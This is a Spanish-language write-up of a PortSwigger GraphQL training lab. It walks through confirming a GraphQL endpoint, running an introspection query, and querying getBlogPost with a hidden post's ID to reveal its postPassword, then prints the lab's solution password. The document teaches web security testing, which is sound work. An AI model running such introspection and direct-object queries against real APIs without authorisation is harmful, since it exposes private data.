# Lab: Accessing private GraphQL posts

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con un blog público:
![image](https://github.com/user-attachments/assets/300c9221-0665-430d-8841-d0eb206e32fe)

Como podemos ver, se nos tramita el endpoint `/graphql/v1` que nos habilita la pestaña `GraphQL`, por lo que tenemos la certeza que nos encontramos ante un endpoint `GraphQL`:
![image](https://github.com/user-attachments/assets/70949a69-079c-4193-94b1-8a77a9bbc9bc)

Podemos observar que estamos tramitando lo siguiente:
![image](https://github.com/user-attachments/assets/5ec42af4-8d7b-4759-af09-8f8f2596cf3a)

- Estamos enviando una consulta `query getBlogSummaries` al endpoint `POST /graphql/v1`.

- En la pestaña `GraphQL`, estamos pidiendo los campos `image`, `title`, `summary`, e `id` de todos los posts de blog (`getAllBlogPosts`).
```json
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```
- La respuesta muestra los datos correspondientes, lo que confirma que la consulta se procesó correctamente:
```json
{
  "data": {
    "getAllBlogPosts": [
      {
        "image": "/image/blog/posts/3.jpg",
        "title": "Apps For Everything",
        "summary": "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and...",
        "id": 4
      },
      {
        "image": "/image/blog/posts/62.jpg",
        "title": "No Silly Names, Please",
        "summary": "We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...",
        "id": 5
      },
      {
        "image": "/image/blog/posts/7.jpg",
        "title": "Faking It! - InstaCam",
        "summary": "People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...",
        "id": 1
      },
      {
        "image": "/image/blog/posts/11.jpg",
        "title": "Identity Theft",
        "summary": "I'm guessing all the people that used to steal people's identities by rifling through their garbage cans, looking for private banking details, are probably very fat and lazy now. With so many working from home opportunities available, in this golden...",
        "id": 2
      }
    ]
  }
}
```
## 🔍 Explicación paso a paso de la respuesta GraphQL

### 1. `data`

Este es el objeto raíz que envuelve la respuesta de una consulta GraphQL.

Siempre que no haya errores, GraphQL devuelve un objeto con una clave `data` que contiene el resultado de la operación.

---

### 2. `getAllBlogPosts`

Es el campo (o *resolver*) que corresponde a la consulta enviada desde el cliente.

En este caso, se pidió que devuelva todas las publicaciones del blog, y responde con un array de objetos.

---

### 3. Cada objeto del array contiene:

| Campo     | Descripción                        |
| --------- | ---------------------------------- |
| `image`   | Ruta de la imagen asociada al post |
| `title`   | Título de la publicación           |
| `summary` | Resumen o descripción corta        |
| `id`      | Identificador único del post       |

---

👉 **Estos campos específicos fueron definidos explícitamente en la consulta GraphQL.**

GraphQL **solo devuelve los campos que el cliente pide**, lo que lo diferencia de REST, donde normalmente se recibe un objeto completo con todos los campos posibles.

En resumen, ya tenemos nuestro endpoint `GraphQL` que se tramita por POST.

Adicionalmente haremos la `Uniersal query` para ratificar que nos encontramos efectiamente ante un endpoint `GraphQL`:
```json
{
  "query": "query { __typename }"
}
```
![image](https://github.com/user-attachments/assets/031b8c99-233f-46e7-982b-f52ec1800b2c)

Como recibimos una respuesta del tipo:
```json
{"data": {"__typename": "query"}}
```
Confirmamos que es un endpoint `GraphQL` válido.

---

Nosotros vimos que nos muestra publicaciones con distintos id:
```json
{
  "data": {
    "getAllBlogPosts": [
      {
        "image": "/image/blog/posts/3.jpg",
        "title": "Apps For Everything",
        "summary": "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and...",
        "id": 4
      },
      {
        "image": "/image/blog/posts/62.jpg",
        "title": "No Silly Names, Please",
        "summary": "We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...",
        "id": 5
      },
      {
        "image": "/image/blog/posts/7.jpg",
        "title": "Faking It! - InstaCam",
        "summary": "People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...",
        "id": 1
      },
      {
        "image": "/image/blog/posts/11.jpg",
        "title": "Identity Theft",
        "summary": "I'm guessing all the people that used to steal people's identities by rifling through their garbage cans, looking for private banking details, are probably very fat and lazy now. With so many working from home opportunities available, in this golden...",
        "id": 2
      }
    ]
  }
}
```

Primer dato curioso, falta el objeto con `"id":3`.

El siguiente paso lógico es hacer una consulta de introspección. En la misma consulta hacemos clic derecho y seleccionamos `GraphQL > Set introspection query`:
![image](https://github.com/user-attachments/assets/4752e218-f3d1-4dd0-98cc-6b91c907d569)

La introspección reveló que cada post contiene los siguientes campos adicionales que no estaban siendo devueltos por defecto en las consultas:
| Campo          | Tipo         | Descripción                     |
| -------------- | ------------ | ------------------------------- |
| `author`       | `String!`    | Nombre del autor del post       |
| `date`         | `Timestamp!` | Fecha de publicación del post   |
| `paragraphs`   | `[String!]!` | Lista de párrafos del contenido |
| `isPrivate`    | `Boolean!`   | Marca si el post es privado     |
| `postPassword` | `String`     | Contraseña asociada al post 🔥  |

El siguiente paso entonces es agregar a la consulta el campo `postPassword`:
![image](https://github.com/user-attachments/assets/935ed213-43e2-45d2-bfac-ef31a32c438c)

Vemos que todas las respuestas contienen el campo `"postPassword":null`. También seguimos notando que no está mostrando el elemento con `"id":3`.

El resolver `getAllBlogPosts` omite ese post a propósito. Posiblemente:

- `id: 3` tiene el campo `isPrivate: true`, y este resolver solo devuelve publicaciones públicas.

- O bien, el servidor filtra los resultados por otros criterios (por ejemplo, moderación o publicación pendiente).

  

Si volvemos a la Instrospecion query, observamos que nos arroja un resolver llamado `getBlogPost`:
![image](https://github.com/user-attachments/assets/a648d998-278a-441d-a4b4-00fdc99d4028)

Esto indica que:

📌 `getBlogPost`
- Es una query (una operación raíz del esquema).

- Recibe un argumento obligatorio (id de tipo Int).

- Devuelve un objeto del tipo BlogPost

Explotación:
```json
query getBlogSummaries {
    getBlogPost(id:3) {
        title
        summary
        postPassword
    }
}
```

Enviamos la request y obtenemos `"postPassword": "qx4hmk83rhp46ec3g40txo2z54linmlj"`:
![image](https://github.com/user-attachments/assets/1d9b2c24-d459-440a-9b0b-7c9f41cd63d0)







